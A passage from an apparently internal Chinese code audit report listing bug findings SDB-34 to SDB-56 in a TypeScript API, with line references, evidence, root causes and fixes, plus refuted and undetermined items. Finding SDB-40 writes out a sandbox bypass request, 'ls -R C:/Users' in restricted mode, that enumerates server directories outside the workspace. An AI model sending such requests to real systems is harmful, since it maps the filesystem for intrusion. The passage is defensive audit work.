- **根因**：`toISOString()` 是 UTC 墙钟却被贴上 `+08:00`；输出为 ISO 8601，而协议要求 `yyyy-MM-dd HH:mm:ss`。`alipay.ts:526-527` 注释记录了同型历史故障。
- **证据**：
```
539	    timestamp: new Date().toISOString().replace(/\.\d{3}Z$/, '+08:00'),
```
```
586	    timestamp: new Date().toISOString().replace(/\.\d{3}Z$/, '+08:00'),
```
- **影响面**：启用支付宝登录后换票与取用户信息 100% 失败，且错误被归一为 500/401，排障看不到时间戳原因。
- **建议修法**：两处改用 `alipay.ts` 的 `formatTimestamp(new Date())`。
- **是否当场可修**：是。

### SDB-34 原文留存预热忽略偏好键名，任意 privacy 偏好为 `true` 即被当作「不留存原文」

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/raw-retention-optout.ts:127-139`；写入 `apps/api/src/routes/user/settings-routes.ts:114-137`；消费 `apps/api/src/services/audit-log-service.ts:640`
- **触发路径**：设置页把 `analyticsEnabled`/`adTracking` 等以 `group='privacy'` 写入 → 进程重启 `preloadRawRetentionOptOuts()` 读取 privacy 组**全部行** → 只要值为 `'true'` 就加入 `optOutCache` → 该用户后续 LLM 原文不再落库。
- **根因**：预热查询只按 `group` 过滤，漏了 `key = KEY_RAW_RETENTION_OPT_OUT`，与单键写入路径口径不一致。
- **证据**：
```
129	    const rows = await db
130	      .select({ userId: userPreferences.userId, value: userPreferences.value })
131	      .from(userPreferences)
132	      .where(eq(userPreferences.group, GROUP_PRIVACY))
133	    optOutCache.clear()
134	    for (const r of rows) {
135	      const row = r as { userId?: string; value?: string | null }
136	      if (!row.userId) continue
137	      // 只认字面量 "true"(与全仓其它布尔开关同一口径)
138	      if (row.value === 'true') optOutCache.add(row.userId)
```
- **影响面**：开启匿名统计/广告个性化的用户被静默判为「不留存原文」，审计与排障原文整体缺失，且重启后才生效、极难定位。
- **建议修法**：预热 `where` 增加 `eq(userPreferences.key, KEY_RAW_RETENTION_OPT_OUT)`。
- **是否当场可修**：是。

### SDB-35 Prometheus 返回 `NaN` 被判为不健康，低流量金丝雀被自动回滚

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/auto-rollback.ts:33-45,106-109`
- **触发路径**：`CANARY_ENABLED=true` → 每 60s `checkCanaryHealth()` → 查询 `sum(rate(5xx[1m]))/sum(rate(all[1m]))`，金丝雀 1 分钟窗口无请求时 Prometheus 返回样本 `"NaN"` → `Number('NaN')` 为 `NaN` → `NaN < 0.05 === false` → 进入 `rollbackCanary`。
- **根因**：只处理「结果为空/不可达」，未过滤非有限数值。
- **证据**：
```
33	export async function checkCanaryHealth(): Promise<CanaryHealthStatus> {
34	  const errorRate = await fetchCanaryErrorRate()
35	  const healthy = errorRate < ERROR_RATE_THRESHOLD
```
```
108	    const value = data.data.result[0]?.value?.[1]
109	    return value ? Number(value) : 0
```
- **影响面**：低流量站点或 1% 金丝雀空闲期被反复误判回滚，灰度安全阀反向变成故障源。
- **建议修法**：`const n = Number(value); return Number.isFinite(n) ? n : 0`，阈值同样做有限性校验。
- **是否当场可修**：是。

### SDB-36 `promoteCanary` / `rollbackCanary` 都按 name 无条件写，回滚可被并发升阶段撤销

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/canary-service.ts:193-211,228-242`
- **触发路径**：管理员 `promote` 读到 `current_stage=canary_1pct` 后，自动回滚先把配置置 `off/rolled_back`，随后 promote 的 `UPDATE ... WHERE name` 无条件写回 `canary_5pct/is_active=true` → 已回滚的坏版本重新接流量。
- **根因**：两条状态迁移都只按 `name` 定位，无 `WHERE current_stage=<读取值> AND is_active` 的 CAS 谓词。
- **证据**：
```
202	    await db.execute(sql`
203	      UPDATE canary_configs
204	      SET current_stage = ${nextStage},
205	          last_promoted_at = ${now},
206	          failure_count = 0,
207	          is_active = ${!reachedTarget},
208	          status = ${reachedTarget ? 'completed' : 'active'},
209	          updated_at = ${now}
210	      WHERE name = ${name}
211	    `)
```
- **影响面**：灰度安全阀失效，故障版本在被自动回滚后仍继续放量。
- **建议修法**：两条 UPDATE 加 CAS 谓词，`rowCount=0` 判冲突并重读。
- **是否当场可修**：是。

### SDB-37 DAG 条件边只写 `cancelled` 标记、层执行不消费，下游节点照跑并进入最终结果

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/subagent-dispatch-service.ts:2917-2933,3013-3039`
- **触发路径**：`dispatch({dag:{edges:[{from:'a',to:'b',condition:'contains:YES'}]}})`，a 输出不含 YES → `:3021` 把 b 标 `cancelled`；下一层 `:2920-2932` 从不读 `dagNodeStatus`，把 b 改回 `running` 并照常调用模型，结果进入 `:3034-3036` 的 `allResults`。
- **根因**：层执行循环未消费跳过标记。
- **证据**：
```
3013	      // 评估条件边:决定下游节点是否继续
3014	      for (const nodeId of layer) {
3015	        const nodeResult = results.get(nodeId) ?? ''
3016	        const downstreamEdges = dag.edges.filter((e) => e.from === nodeId)
3017	        for (const edge of downstreamEdges) {
3018	          const shouldContinue = evaluateCondition(edge.condition, nodeResult)
3019	          if (!shouldContinue) {
3020	            // 条件不满足 → 标记下游节点为 cancelled(跳过)
3021	            runtime.dagNodeStatus.set(edge.to, 'cancelled')
```
- **影响面**：分支/条件编排完全失效；被判定跳过的节点仍产生付费调用并污染最终产物。
- **建议修法**：层执行前检查 `dagNodeStatus === 'cancelled'` 时跳过并向下游传播。
- **是否当场可修**：是。

### SDB-38 DAG 模式静默丢弃 `retry` / `tokenQuota`，配额在 DAG 会话中不生效

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/subagent-dispatch-service.ts:2462-2467,2874-2880,3033-3045`
- **触发路径**：`dispatch` 接受并保存 `quotas.tokenQuota`，`orchestration='dag'` 时经 `:2464` 传入 `runDispatchDag`，但形参被改名为 `_retry/_quotas` 且函数体无任何配额检查，只在 `:3037` 看节点是否 failed。
- **根因**：DAG 执行器未实现配额/退避，签名刻意丢弃参数。
- **证据**：
```
2462	    const execution =
2463	      preferDag && runtime.dag
2464	        ? this.runDispatchDag(id, prompt, runtime.retry, runtime.quotas)
```
```
2874	  /** DAG 模式执行:按拓扑排序分层,同层并行,条件边评估 */
2875	  private async runDispatchDag(
2876	    id: string,
2877	    prompt: string,
2878	    _retry?: RetryConfig,
2879	    _quotas?: QuotaConfig,
2880	  ): Promise<void> {
```
- **影响面**：DAG 会话 token 超限不中止，成本不可控；与单链模式行为不一致。
- **建议修法**：DAG 每次调用前后累计 token 并调用 `checkQuotas`，按 `_retry` 实现重试。
- **是否当场可修**：是。

### SDB-39 `searchSymbols` 未传 `ownerUuid`，命中 fail-closed `1=0`，符号检索永久为空且每次仍付 embedding 成本

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/context-engine-service.ts:411-421`；`apps/api/src/services/codebase-index-service.ts:105-110,301`
- **触发路径**：`GET /api/context/symbols?q=xxx` → `searchSymbols` → `:418-421` 调 `codebaseIndexService.search({query, topK})` 不传 `ownerUuid` → `_ownerScope(undefined)` 返回 `sql\`1 = 0\`` → 恒 0 行；此前已先调用 `getEmbedding(query)` 产生外部成本。
- **根因**：内部调用漏传必填 `ownerUuid`；缓存键也不含 userId（修好后会跨用户串结果）。
- **证据**：
```
411	  /** symbol 检索:复用 codebaseIndexService 语义搜索(pgvector ANN) */
412	  async searchSymbols(query: string, limit: number): Promise<SymbolSearchItem[]> {
413	    if (!query.trim()) return []
414	    const cacheKey = `symbol:${query}:${limit}`
415	    const cached = this.cache.get(cacheKey) as SymbolSearchItem[] | undefined
416	    if (cached) return cached
417	    try {
418	      const chunks = await codebaseIndexService.search({
419	        query,
420	        topK: limit,
421	      })
```
- **影响面**：`@符号` 检索上线即不可用；每次请求空跑一次 embedding 外部调用。
- **建议修法**：`searchSymbols(query, limit, ownerUuid)` 透传，并把 userId 纳入缓存键。
- **是否当场可修**：是。

### SDB-40 沙箱路径闸遗漏 `ls/dir/wc/stat/test`，受限模式可枚举任意目录

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/workspace-ai-service.ts:991-1013,1015-1048,1228-1282`
- **触发路径**：工作区成员 `POST /workspace-ai/fs/run {"workspacePath":"<其工作区>","command":"ls -R C:/Users","mode":"restricted"}`。`ls` 在 `SANDBOX_BINARY_WHITELIST` 但不在 `SANDBOX_FILE_TOOL_BINARIES`，`:1236` 的路径收敛整段被跳过，`execFile('ls',['-R','C:/Users'],{cwd:工作区})` 直接执行；`wc/stat/test` 同理泄露存在性/行数/字节数。
- **根因**：白名单与「需要路径收敛的二进制集合」两张表不同步。
- **证据**：
```
1015	const SANDBOX_BINARY_WHITELIST = new Set<string>([
...
1022	  'ls',
1023	  'dir',
...
1029	  'wc',
...
1038	  'test',
...
1048	  'stat',
```
```
1236	    if (SANDBOX_FILE_TOOL_BINARIES.has(binary)) {
```
- **影响面**：已授权用户可越出工作区枚举服务器文件系统，为后续读取/攻击提供地图。
- **建议修法**：把 `ls/dir/wc/stat/test` 并入 `SANDBOX_FILE_TOOL_BINARIES`，统一做 `isInsideRoot`。
- **是否当场可修**：是。

### SDB-41 spec 流水线 `git commit` 无 pathspec，会把仓库里其他已暂存改动一并提交

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/spec-service.ts:1457-1473`
- **触发路径**：用户仓库此前已有 `git add` 的业务改动 → `POST /spec/pipeline/run {autoCommit:true}` → `:1470` 只暂存 spec，`:1471-1474` 的 commit 无 pathspec/`--only`，把 index 中所有已暂存文件一起提交；spec 无变化时也会提交别人的暂存内容。
- **根因**：commit 未限定 pathspec。
- **证据**：
```
1470	        runGit(['add', specRelPath], 15000)
1471	        runGit(
1472	          ['commit', '--no-verify', '-m', `chore(spec): pipeline ${pipelineId} 更新 spec`],
1473	          15000,
1474	        )
```
- **影响面**：无关改动被裹进 `chore(spec)` 提交，提交历史与回滚边界被污染。
- **建议修法**：改为 `git commit --no-verify -m ... -- <specRelPath>`。
- **是否当场可修**：是。

### SDB-42 cc-switch 导入两条路径均不可用：`.db` 被扩展名白名单拦截，JSON 被当作 SQLite 解析

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/cli-import.ts:313-340`；`apps/api/src/services/cli-import/index.ts:60-74,248-275`
- **触发路径**：(a) 上传官方 `cc-switch.db` → `:314` 白名单不含 `.db` → `:319-322` 直接 400；(b) 上传 `config.json` 且 `source='cc-switch'` → `:336` `isBinary=true` 只传 buffer → `pickParserBySource` 取 `PARSERS` 中第一条（SQLite 解析器）→ 解析 JSON 必失败，JSON 解析器从 HTTP 入口不可达（`parse-payload` 只接收已解析数据，不解析）。
- **根因**：扩展名白名单未含 `.db`；且按 source 而非输入形态/文件名选 parser。
- **证据**：
```
314	          const CONFIG_ALLOWED_EXTS = ['.json', '.yaml', '.yml', '.toml', '.ini', '.conf']
```
```
319	          if (ext && !CONFIG_ALLOWED_EXTS.includes(ext)) {
320	            return reply
321	              .status(400)
322	              .send(error(400, `仅支持配置文件格式: ${CONFIG_ALLOWED_EXTS.join(', ')}`))
```
```
336	      const isBinary = source === 'cc-switch'
337	      const preview = await parseBySource(source, {
338	        sourcePath: fileName ?? source,
339	        buffer: isBinary ? fileBuffer : undefined,
```
- **影响面**：cc-switch 用户导入全链路 400，功能等同下线。
- **建议修法**：白名单加 `.db`；按文件名/输入形态选择 parser。
- **是否当场可修**：是。

### SDB-43 告警检查自身 DB 失败被吞成「0 条错误」，任务仍记 success

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/alert-check-service.ts:262-298`；消费侧 `apps/api/src/workers/scheduler-worker.ts:352-363`
- **触发路径**：`alert-check-daily` → `checkDailyAlerts()` → 两条 `audit_logs` 聚合任一抛错 → `:285-287` 只把错误塞进 `errors`，`checked/resolved` 保持 0 → `:298` 的 `escalated` 不读 `errors` → worker 只记录 5 个字段，从不读 `result.errors`，任务照常记 success。
- **根因**：`errors` 既不参与 `escalated` 也无调用方读取，「没判到」被写成「判过且 0 条」。
- **证据**：
```
265	  try {
...
284	    resolved = oldAlerts[0]?.count ?? 0
285	  } catch (err) {
286	    errors.push(err instanceof Error ? err.message : String(err))
287	  }
```
```
297	  // 升级逻辑：最近 24h 错误数超过 50,或有备份缺失/空备份/过期/**无法判定** → 需升级通知
298	  const escalated = checked > 50 || backupIssues.length > 0 || backupUndetermined.length > 0 ? 1 : 0
```
- **影响面**：audit_logs 查询失效期间告警面自证健康，完全不会升级通知。
- **建议修法**：`escalated` 条件并入 `errors.length > 0`，并把 `errors` 推送到通知。
- **是否当场可修**：是。

### SDB-44 USDT 先判过期再查链，跨过 `expiresAt` 的已付款订单被置 `expired` 且 webhook 也无法补救

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/payment-usdt-service.ts:470-478,934-936`；轮询 `:1051-1055`
- **触发路径**：轮询选中订单后、执行 `checkUsdtPaymentStatus` 前越过 `expiresAt` → `:472-477` 直接落 `expired`、不查链；此后 `confirmUsdtPaymentWithOnChainCheck` 走非 pending 分支，`:934-936` 抛「订单状态为 expired,无法确认」。另在到期前最后一分钟付款的订单可能整轮被 `gt(expiresAt, now)` 跳过。
- **根因**：过期判定排在链上检测之前，过期后无宽限/链上补救通道。
- **证据**：
```
470	  // 检查过期
471	  const now = new Date()
472	  if (order.expiresAt < now) {
473	    await db
474	      .update(usdtPayments)
475	      .set({ status: 'expired' })
476	      .where(and(eq(usdtPayments.orderId, orderId), eq(usdtPayments.status, 'pending')))
477	    return { orderId, status: 'expired', detected: false, txHash: null, amountPaid: null }
```
- **影响面**：低概率卡单，一旦命中需人工处理；链上已到账资金不会自动入账。
- **建议修法**：先查链、命中有效交易优先入账；`expired` 保留宽限期内链上确认能力。
- **是否当场可修**：是。

### SDB-45 签到同步把「对端根本没有该账号」当可重试失败，永久重推并误报升级告警

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/relay-account-pool-checkin-sync.ts:652-673`；对端契约 `apps/ai-service/app/services/checkin_store.py:1676-1693`；判据 `:341`
- **触发路径**：停用/删除一枚从未成功同步到签到侧的账号 → `markCheckinSyncPending(...,'state',...)` → 每轮 `retryPendingCheckinSyncs()` → `pushPoolState` 对端返回 `found:false` → `:341` 一律判失败 → `:665` 继续落 pending（attempts+1）→ 永不清除；attempts 到 20 触发一次误报告警后无限静默重试。
- **根因**：重推器缺少「对端不存在该账号 ⇒ 无需同步」这一档。
- **证据**：
```
341	  if (!first || first.found !== true) {
```
```
660	      if (r.ok) {
661	        await clearCheckinSyncPending([row.id])
662	        out.cleared++
663	      } else {
664	        const err = r.error ?? '未知错误'
665	        await markCheckinSyncPending([row.id], 'state', state, err)
```
- **影响面**：账号 `pending` 徽章永久亮起；每轮巡检产生一次无效内网请求；无数据错误。
- **建议修法**：`found:false` 按「对端无此账号」清 pending 并计数。
- **是否当场可修**：是。

### SDB-46 共享标记/手机号补全：凭证取自读副本快照、版本号取自主库 RETURNING，向签到侧推「旧凭证 + 更高版本」

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/relay-account-pool-service.ts:1509-1518,1539-1551,1564-1584`；`apps/api/src/db/index.ts:37,53-54`
- **触发路径**：`POST /admin/relay/accounts/:id/share`（或手机号补全）→ `:1514` 从 `dbRead` 读快照（配 `DATABASE_READ_REPLICA_URL` 时连副本）→ `:1539-1551` 主库 UPDATE 把 `credVersion+1` 并 RETURNING → `:1567` 用**副本里的旧凭证** + 新版本号构造推送载荷。
- **根因**：同一载荷的「凭证」与「版本号」来自两个一致性面，版本前进而凭证回退，击穿对端 `incoming_ver <= existing_ver` 防降级。
- **证据**：
```
1514	  const [row] = await dbRead
1515	    .select()
1516	    .from(aiRelayAccountPool)
1517	    .where(eq(aiRelayAccountPool.id, accountId))
```
```
1567	      const credentials = decryptAccountCredentials(row)
1568	      const acc = buildPoolSyncAccount({
...
1575	        credVersion: written.credVersion,
```
- **影响面**：签到侧被写回旧票且版本更高，后续正确推送要等下一次换票才被接受；期间可能连续 401。
- **建议修法**：UPDATE `.returning()` 全行（或 UPDATE 后主库重读），凭证与版本同源。
- **是否当场可修**：是。

### SDB-47 未配置任何推送通道时 `sendPush` 返回成功，管理端统计「全部成功」

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/push-provider.ts:288-301`；`apps/api/src/routes/push.ts:121-133`
- **触发路径**：`FCM_*`/`GETUI_*` 均未配置 → `detectPushProvider()` 返回 `'stub'` → 每个 token 走 `:296-300` 返回 `success:true` → 路由 `:126` 统计 `failed=0`，响应无 stub 标记。
- **根因**：桩分支把「没有通道、一次都没发出」记为成功，与 email（`stub:true sent:false`）/SMS（fail-closed）口径相反。
- **证据**：
```
296	  return {
297	    provider: 'stub',
298	    success: true,
299	    messageId: `stub-${Date.now()}`,
300	  }
```
- **影响面**：默认/漏配环境下群发显示全部成功，实际零投递，且无失败可观测信号。
- **建议修法**：stub 返回 `success:false, error:'push_not_configured'`。
- **是否当场可修**：是。

### SDB-48 Key 用量按 `userId` 聚合，同一用户多个 API Key 显示同一份用量

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/developer-api-keys-service.ts:366-409`；路由 `apps/api/src/routes/developer.ts:560-574`
- **触发路径**：`GET /api-keys/:id/usage` → 校验归属后用 `userId` 统计 `api_logs`；同一用户的任意 Key 返回相同的 `callCount/lastUsedAt/topEndpoints`。
- **根因**：计量维度用了 `userId` 而非 `apiKeyId`；`api_logs` 本身无密钥列。
- **证据**：
```
386	  // apiLogs 通过 userId 关联(密钥使用时以密钥所有者身份记录)
387	  const [countRow] = await dbRead
388	    .select({ callCount: sql<number>`count(*)::int` })
389	    .from(apiLogs)
390	    .where(eq(apiLogs.userId, userId))
```
- **影响面**：Key 级用量/排障数据错误，计费对账依据失真。
- **建议修法**：改按 `llm_call_logs.api_key_id` 聚合，或给 `api_logs` 补列并在写入侧填充。
- **是否当场可修**：是。

### SDB-49 ai-feed 分类批与摘要批并发写同一列，`llm_summary` 被原文/NULL 覆盖并重复付费

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/ai-feed-service.ts:1388-1397,1553-1586,1688-1694`
- **触发路径**：新条目同时满足 `llm_processed_at IS NULL` 与 `llm_summary IS NULL`；`Promise.all([processLlmBatch(), translateTitles(), summarizeFeedItems()])` 并发；摘要批 `:1574-1577` 写入 LLM 摘要后，分类批 `:1390-1393` 用 `item.summary ?? null` 无条件覆盖；写成 NULL 时下一轮重新摘要。
- **根因**：两路对同一行无条件写同一列，UPDATE 无 `isNull(llmSummary)` 条件。
- **证据**：
```
1390	    await db
1391	      .update(aiFeedHotItem)
1392	      .set({
1393	        llmCategory: category,
1394	        llmSummary: item.summary ?? null,
```
```
1574	        await db
1575	          .update(aiFeedHotItem)
1576	          .set({ llmSummary: llmResult.trim().slice(0, 2000), updatedAt: new Date() })
```
- **影响面**：摘要质量回退为原文/空，并产生重复摘要成本。
- **建议修法**：分类批 UPDATE 加 `isNull(llmSummary)`，或两批串行/拆列。
- **是否当场可修**：是。

### SDB-50 `CodebaseIndexer.index` 写索引前不建 `.ihui`，首次索引必 ENOENT

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/workspace-ai-service.ts:1555-1559`
- **触发路径**：对尚无 `.ihui` 的目录调 `POST /workspace-ai/codebase/index` → 全树遍历完成后 `:1555` 抛 ENOENT → 路由 400，索引不生成；`/vector/index` 连带不可用。
- **根因**：写文件前未 `mkdirSync(dirname,{recursive:true})`。
- **证据**：
```
1555	    writeFileSync(
1556	      join(workspacePath, '.ihui', 'codebase-index.json'),
1557	      JSON.stringify(index, null, 2),
1558	      'utf-8',
1559	    )
```
- **影响面**：首次索引失败，遍历 IO 全白费。
- **建议修法**：写前建目录，或复用内部会建目录的 `writeJson`。
- **是否当场可修**：是。

### SDB-51 `terminal_run` 白名单含空格项，却只拿首个 token 全等比较，`git status` 等始终被拒

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/crew-tools.ts:115-136,300-319`
- **触发路径**：LLM 调 `terminal_run {"command":"git status"}` → `tokens[0]='git'` → `:313` 与 `'git status'` 比较不等 → 拒绝，错误信息仍把 `git status` 列为允许。
- **根因**：白名单按前缀/二元组设计，校验却用单 token 全等。
- **证据**：
```
300	      const tokens = cmd.split(/\s+/).filter(Boolean)
...
312	      const binary = tokens[0]!
313	      const isAllowed = TERMINAL_WHITELIST.some((w) => binary === w)
```
- **影响面**：工具说明中的只读 git 能力全部不可用（功能缺失，非安全）。
- **建议修法**：按前缀 token 匹配，或二进制名 + 子命令二次校验。
- **是否当场可修**：是。

### SDB-52 algorithm-record 同批出现重复 `record_no` 时整批 upsert 报错，整份文件数据丢失

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/algorithm-record-service.ts:181-215`
- **触发路径**：一份 docx 的表格里同一备案编号出现两行（合并单元格/一个算法多产品行）→ `values` 含两条相同 `recordNo` → 单条 `INSERT ... ON CONFLICT DO UPDATE` 命中同一目标两次 → PostgreSQL 报 `ON CONFLICT DO UPDATE command cannot affect row a second time`，整批失败；`importFromPage` 仅 warn 后继续下一页。
- **根因**：入库前未按 `recordNo` 去重。
- **证据**：
```
198	    await db
199	      .insert(algorithmRecord)
200	      .values(values)
201	      .onConflictDoUpdate({
202	        target: algorithmRecord.recordNo,
```
- **影响面**：该批次数据整体丢失，`updated` 恒为 0 使统计失真。
- **建议修法**：push 前用 Map 按 recordNo 去重（后行覆盖），并按冲突结果统计 updated。
- **是否当场可修**：是。

### SDB-53 `resolved` 统计的是「全历史 error 累计」，不是「已恢复」

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/alert-check-service.ts:276-284`
- **触发路径**：每次 `alert-check-daily` → `:282` 只加 `createdAt < 24h 前` 的上界、无下界窗口 → 建表以来所有含 error 的审计日志都计入 `resolved`，并被写进日志与告警 metadata。
- **根因**：把「24h 之前」当成「已恢复」，未限定统计窗口。
- **证据**：
```
277	    const oldAlerts = await db
278	      .select({
279	        count: sql<number>`count(*)::int`,
280	      })
281	      .from(auditLogs)
282	      .where(and(ilike(auditLogs.action, '%error%'), lt(auditLogs.createdAt, twentyFourHoursAgo)))
```
- **影响面**：`resolved` 单调递增且量级等于历史全量，读账者会误读为「今日恢复数」。
- **建议修法**：加下界窗口（如 24h~48h）或改名为 `legacyErrorTotal`。
- **是否当场可修**：是。

### SDB-54 导入判据的正则比调度器 RRULE 解析更窄，合法周期计划被落成「启用但永不到期」的 once 行

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/runtime-import-plan.ts:65,147-156`；`apps/api/src/services/agent-automation-scheduler.ts:109-119`；放行侧 `apps/api/src/routes/automations.ts:407-414`
- **触发路径**：导入 `trigger="FREQ=DAILY;INTERVAL=1;BYHOUR=9"`（调度器 `parseRruleParts` 逐段解析、忽略未知键，能算出 09:00）→ `:65` 正则只允许 `FREQ` 打头且只认 `BYHOUR/BYMINUTE/BYDAY` ⇒ `mapped=false` → 落 `once + rrule=null + scheduledAt=null` → 用户 `PATCH status='active'`（once 不校验 scheduledAt）→ `nextRunAt` 仍为 null，`scheduledAt` 为 NULL ⇒ 永远不被捞起。
- **根因**：导入侧判据比调度器自身解析器更窄；放行侧不校验 once 必须有 `scheduledAt`。
- **证据**：
```
65	const SUPPORTED_RRULE = /^FREQ=(HOURLY|DAILY|WEEKLY)(;(BYHOUR|BYMINUTE|BYDAY)=[0-9A-Z,+-]+)*$/
```
```
147	      const mapped = SUPPORTED_RRULE.test(trigger)
...
153	        scheduleType: mapped ? 'recurring' : 'once',
154	        rrule: mapped ? trigger : null,
155	        scheduledAt: null,
```
- **影响面**：合法周期计划导入后显示启用、实际永不执行，只会留一条 skipped 记录。
- **建议修法**：改以 `parseNextRun(trigger, ...) !== null` 为判据；once 启用时要求 `scheduledAt` 非空。
- **是否当场可修**：是。

### SDB-55 Telegram 渠道固定 `parse_mode:'HTML'` 但正文不转义，含 `<`/`&` 的消息必发失败

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/clawdbot/channels.ts:401-424`
- **触发路径**：`POST /api/clawdbot/channels/:id/send` → `sendTelegram` → `:417` 把任意 `content` 原样作为 HTML 提交；内容含 `<`/`>`/`&`（AI 输出代码、比较符号极常见）时 Telegram 返回 400 `can't parse entities`，`:421-423` 抛错。
- **根因**：声明 HTML 解析模式却未做实体转义。
- **证据**：
```
412	  const resp = await channelFetch(
413	    `https://api.telegram.org/bot${botToken}/sendMessage`,
414	    {
415	      method: 'POST',
416	      headers: { 'Content-Type': 'application/json' },
417	      body: JSON.stringify({ chat_id: chatId, text: content, parse_mode: 'HTML' }),
418	    },
```
- **影响面**：Telegram 通知在常见内容下整条丢失，失败原因对使用者不直观。
- **建议修法**：发送前转义 `& < >`，或去掉 `parse_mode`。
- **是否当场可修**：是。

### SDB-56 clawdbot `/chat` 只把 assistant 轮写入历史，用户上一轮提问永久丢失且内存无上限

- **严重度**：P3
- **文件与行号**：`apps/api/src/services/clawdbot/clawdbot-service.ts:196-234`
- **触发路径**：`POST /api/clawdbot/chat` → `chat()`：`:209` 从 `getRecentHistory` 带历史，但 `:222-223` 只 push assistant 响应，从不把本轮 `content` 写回 `conversations`；只有信道路径 `recordConversation` 才写 user 轮。因此多轮对话模型看不到用户前几轮提问。`:223` 的 push 也没有信道路径 `:187` 的 100 条裁剪。
- **根因**：直聊路径漏写用户轮，未复用裁剪逻辑。
- **证据**：
```
209	        ...this.getRecentHistory(userId),
210	        { role: 'user' as const, content },
...
222	    if (!this.conversations.has(userId)) this.conversations.set(userId, [])
223	    this.conversations.get(userId)!.push(response)
```
- **影响面**：多轮答非所问/重复；管理员进程内存随轮次线性增长。
- **建议修法**：同时写入 user 轮，并统一套用 100 条裁剪。
- **是否当场可修**：是。

## 十九、第五轮已否证（附复核依据，不计入新增）

1. **`workspace-ai` codebase/vector 越权读任意绝对路径** —— **重复**。`findings-api.md` F-401 已逐字覆盖 `codebase/index`、`vector/index`、`vector/search` 三端点缺 workspace 权限校验（含 `workspacePathBody` 与正文回传）；本轮子代理给出的行号与证据与 F-401 完全同源，不新增编号。
2. **知识库 chunk 单条 bulk insert 超参数上限 + 无事务** —— **重复**。F-139 已覆盖 `knowledge-rag-service.ts:174-205`（P1），含参数上限推算与「先插 doc 留空壳」的后果；本轮无新增证据。
3. **对账 `buildDiff` 只比较订单号** —— **重复**。F-550 已逐字覆盖 `reconciliation-service.ts:266-291` 只做集合差、金额/状态不参与比较。
4. **佣金校准丢 `tokenQuantity`** —— **重复**。F-234/F-409/F-411 已覆盖 `commission-settle-service.ts:65-77` 的同一根因（只传 `{id}` → `tokenQuantity ?? 0`）。
5. **「不限」窗口 `-1` 被 `Math.max` 算成 0** —— **重复**。即本报告 SDB-04，本轮子代理独立复现，不重复计入。
6. **agent-runtime `session-store` 一次 DB 失败即永久 `dbDisabled`** —— **同源既有条目**。`findings-api.md:5871` 已记录 `clawdbot/session-manager.ts` 的同一闩锁模式，并注明 agent-runtime 侧「DB 方法无活跃入口」。本轮确认 `routes/agent-runtime.ts` 存在活跃调用（`:42/59/90/128/258/284`），属**既有条目的证据补强**，按纪律不新增编号。
7. **`anomaly-detector.recordUserBehavior` 终身累计均值** —— 否证为可达缺陷：全仓无生产调用方（仅测试直调），路径不可达。
8. **`traffic-stats-service` 缓存键不含 source** —— 已被台账记录，且当前唯一调用方走默认 `api_logs`，无真实错配路径，不单列。

## 二十、第五轮未判定（写清缺什么证据）

1. **`relay-upstream-forwarder.ts:438-439,561-567` 多帧 usage 覆盖为 0** —— 缺上游 SSE `message_start`/`message_delta` 的真实报文形状样本；若后帧只含 output_tokens 则 promptTokens 会被覆盖成 0。
2. **`relay-account-pool-scheduler.ts:806` sweep 锁 TTL(10min) 是否覆盖最坏一轮** —— 缺「候选上限 × 并发 × 重试」的单轮最坏耗时实测。
3. **`relay-account-pool-checkin-sync.ts:653` `meta.state ?? 'enabled'`** —— 若 DB 中 `checkinSync.state` 存在非法字符串，重推会把签到侧重新启用；缺该形状的真实行样本。
4. **`relay-response-cache.ts` 跨用户复用** —— 缓存键不含 user 维度，但同 prompt 同答案是否为产品口径无法从代码判定（F-180 已覆盖维度缺失，不重报）。
5. **`relay-commission-service.ts:237` 插库无唯一键 / `:294-341` 释放未校验 rowCount** —— 缺「同一 callLog 重放或补偿重复触发」的真实路径，以及并发删 Key 的实测。
6. **`coupon-service.redeemCoupon` 传 `tx` 时仍用全局 `db` 翻转券状态** —— 缺「传 tx 后外层事务回滚」的真实调用点。
7. **`wechat-subscribe-message.ts:38-52` 取 openid 无 orderBy** —— 缺「同 appid 下同一 userId 出现多行 `platform='wechat'`」的数据样本。
8. **`oauth-providers.generateQrcode` 把 200+errcode 的 JSON 当 PNG 返回** —— 全仓未找到该函数的实际调用方，缺真实路径。
9. **`sms.ts:262-270` 限速失败不退还配额** —— 缺「限速本身是否计一次请求」的设计口径。
10. **`patrol-scheduler.ts` / `subagent-dispatch` 多副本重复执行** —— 缺实际部署为多副本的证据与 Redis 键隔离信息。
11. **`document-parser` 只限原始 20MB、不限解压后体积** —— 缺可复现的压缩炸弹样本与内存实测。
12. **`knowledge-chat-context.ts:62` 全局知识（ownerUuid 空）永不命中** —— 缺线上存在 `ownerUuid=''` 知识行且存在不传 `metadata.userId` 的调用样本。
13. **`agent-automation` 导入无同名去重** —— 已核实 `user_automations` 无 `(user_id,name)` 唯一索引，不会整批失败，缺仅「重复行」的业务口径。

## 二十一、第五轮覆盖自证与收敛判定

- **基线核对**：`git fetch origin --prune` 后 `git rev-parse origin/main` = `d4e1621806`。`git diff --name-only origin/main -- apps/api/src/services` 仅 `apps/api/src/services/email-templates.ts` 一个文件有差异；该文件按纪律用 `git show origin/main:apps/api/src/services/email-templates.ts` 读取，其余 238 个文件工作树内容与基线逐字节一致。全程只读。
- **集合划分（可复现）**：
  1. 全量：`git ls-tree -r --name-only origin/main -- apps/api/src/services` 剔除 `__tests__`/`*.test.ts`/`*.spec.ts` ⇒ **365**。
